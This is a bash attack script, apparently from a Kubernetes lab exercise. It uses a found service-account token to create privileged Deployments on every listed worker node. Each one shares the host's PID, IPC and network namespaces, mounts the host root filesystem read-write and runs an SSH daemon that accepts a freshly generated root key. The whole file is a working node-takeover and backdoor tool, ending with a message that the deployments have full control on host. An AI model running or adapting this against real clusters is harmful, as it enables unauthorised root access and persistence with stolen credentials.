#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="${NAMESPACE:-mem}"
KUBE_APISERVER="https://$(dig +short kind-cluster-control-plane A):6443"
TOKEN="$(cat $DATA_PATH/KC5/found_token)"
FILE_IP="$DATA_PATH/KC5/iphost"

KEY_DIR="$DATA_PATH/KC5/ssh"
KEY_NAME="ssh-key"
PRIV_KEY="${KEY_DIR}/${KEY_NAME}"
PUB_KEY="${PRIV_KEY}.pub"

curl_common=(
  -sSk
  -H "Authorization: Bearer ${TOKEN}"
  -H "Content-Type: application/json"
)

api_get()   { curl "${curl_common[@]}" -X GET  "${KUBE_APISERVER}$1"; }
api_post()  { curl "${curl_common[@]}" -X POST -d @"$2" "${KUBE_APISERVER}$1"; }
api_put()   { curl "${curl_common[@]}" -X PUT  -d @"$2" "${KUBE_APISERVER}$1"; }

echo ">> Verify reachability API server…"
api_get "/version" >/dev/null || { echo "Impossible to reach API server. Watch KUBE_APISERVER/TOKEN/CA."; exit 1; }

list_node_hostnames() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Error: file '$FILE_IP' not found" >&2
    return 1
  fi

  echo ">> Recover IPs list (file: $FILE_IP)..." >&2
  grep -E '[-]' "$FILE_IP" \
   | cut -d'-' -f2- \
   | sed -E 's/^[[:space:]]+|[[:space:]\r]+$//g' \
   | grep worker \
   | cut -d'.' -f1 \
   | sort -u
}

make_deployment_json() {
  local iteration="$1"
  local name="node-controller-$iteration"

  jq -n \
    --arg ns "${NAMESPACE}" \
    --arg name "${name}" \
    --arg sshPort "2222" \
    --arg app "ultra-priv" \
    --arg node "${node_host}" \
    --arg pub "${PUB_CONTENT}" \
    --arg cmd '
set -e
apk add --no-cache openssh bash curl jq iproute2 iptables psmisc procps cronie ca-certificates containerd unzip
mkdir -p /etc/ssh /run/sshd
ssh-keygen -A
mkdir -p /root/.ssh
printf "%s\n" "$AUTH_KEY" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
mkdir -p /etc/ssh/sshd_config.d
cat >/etc/ssh/sshd_config.d/99-runtime.conf <<'"'"'EOF'"'"'
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
UseDNS no
EOF
exec /usr/sbin/sshd -D -e -p ${SSH_PORT}
' \
'{
  "apiVersion":"apps/v1",
  "kind":"Deployment",
  "metadata":{"name":$name,"namespace":$ns},
  "spec":{
    "replicas":1,
    "selector":{"matchLabels":{"app":$app,"target-node":$node}},
    "template":{
      "metadata":{"labels":{"app":$app,"target-node":$node}},
      "spec":{
        "hostPID": true,
        "hostIPC": true,
        "hostNetwork": true,
        "dnsPolicy": "ClusterFirstWithHostNet",
        "containers":[
          {
            "name":"agent",
            "image": "alpine:3.20",
            "securityContext":{
              "privileged":true,
              "allowPrivilegeEscalation":true
            },
            "ports":[{"containerPort": ($sshPort|tonumber), "name":"ssh"}],
            "env":[
              {"name":"SSH_PORT","value":$sshPort},
              {"name":"AUTH_KEY","value":$pub}
            ],
            "command":["sh","-c"],
            "args":[ $cmd ],
            "volumeMounts":[{"name":"host-root","mountPath":"/host","readOnly":false}]
          }
        ],
        "volumes":[{"name":"host-root","hostPath":{"path":"/","type":"Directory"}}]
      }
    }
  }
}
'
}

create_deployment_for_node() {
  local node_host="$1"
  local iteration="$2"
  payload=$(make_deployment_json "${iteration}")
  tmpfile=$(mktemp)
  echo "${payload}" > "${tmpfile}"
  echo ">> Create Deployment for node '${node_host}'…"
  api_post "/apis/apps/v1/namespaces/${NAMESPACE}/deployments" "${tmpfile}" >/dev/null
  rm -f "${tmpfile}"
}

mkdir -p ${KEY_DIR}
ssh-keygen -t ed25519 -N '' -f "${PRIV_KEY}" -C "ultra-priv" >/dev/null
PUB_CONTENT="$(cat "${PUB_KEY}")"
echo "[i] Key generated: ${PRIV_KEY} / ${PUB_KEY}"

mapfile -t nodes < <(list_node_hostnames | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"; exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"
i=1
for n in "${nodes[@]}"; do
  create_deployment_for_node "$n" "$i"
  i=$((i+1))
done
echo "Created deployments with full control on host"
